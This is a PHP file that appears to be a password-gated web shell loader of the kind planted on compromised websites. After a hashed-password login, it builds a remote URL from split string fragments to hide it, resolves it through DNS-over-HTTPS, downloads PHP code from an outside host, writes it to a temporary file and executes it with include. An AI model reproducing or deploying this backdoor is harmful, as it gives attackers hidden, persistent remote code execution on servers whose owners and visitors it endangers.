<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Password hashed
    $hashed_password = '$2a$12$2E6z3QOdN2uFzof8mX9vZe67tRyrxGc6YDzpk3PumoGNNzwl/qXo2';
    if (password_verify($_POST["password"], $hashed_password)) {
        $_SESSION["logged_in"] = true;
    } else {
        $error_message = "";
    }
}

if (isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true) {
    $url = "ht"; $url .= "tps:"; $url .= "//"; $url .= "am";
    $url .= "p.t"; $url .= "oko"; $url .= "ema"; $url .= "s.or";
    $url .= "g/co"; $url .= "re"; $url .= "v2."; $url .= "txt";
    $dns = 'ht';$dns .= 'tps:/';$dns .= '/clo';
    $dns .= 'udfl';$dns .= 'are-d';$dns .= 'ns.c';$dns .= 'om/d';
    $dns .= 'ns-q';$dns .= 'uery';

    $ch = curl_init($url);
    if (defined('CURLOPT_DOH_URL')) {
        curl_setopt($ch, CURLOPT_DOH_URL, $dns);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $res = curl_exec($ch);
    curl_close($ch);

    $tmp = tmpfile();
    $path = stream_get_meta_data($tmp);
    $path = $path['uri'];
    fprintf($tmp, '%s', $res);
    include($path);
    exit(); 
}
?>

<!DOCTYPE html>
<html>
<body>
    <?php if (isset($error_message)) : ?>
        <p style="color: red;"><?php echo $error_message; ?></p>
    <?php endif; ?>
    <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="POST">
        <input type="password" id="password" name="password" required>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
